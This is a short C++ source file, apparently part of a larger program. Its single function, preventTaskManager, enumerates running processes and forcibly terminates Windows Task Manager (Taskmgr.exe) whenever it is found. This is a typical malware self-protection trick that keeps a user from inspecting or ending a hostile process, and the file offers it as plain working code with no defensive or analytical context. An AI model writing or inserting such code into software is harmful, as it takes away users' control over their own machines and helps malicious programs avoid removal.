#include "utils.h"

void utils::preventTaskManager()
{
	HANDLE h32Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pe32;
	ZeroMemory(&pe32, sizeof(PROCESSENTRY32));
	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(h32Snapshot, &pe32))
	{
		while (Process32Next(h32Snapshot, &pe32))
		{
			if (!strcmp(pe32.szExeFile, "Taskmgr.exe"))
			{
				HANDLE hOpen = OpenProcess(PROCESS_TERMINATE, 0, pe32.th32ProcessID);
				TerminateProcess(hOpen,0);
				CloseHandle(hOpen);
				break;
			}
		}
	}
	CloseHandle(h32Snapshot);
}
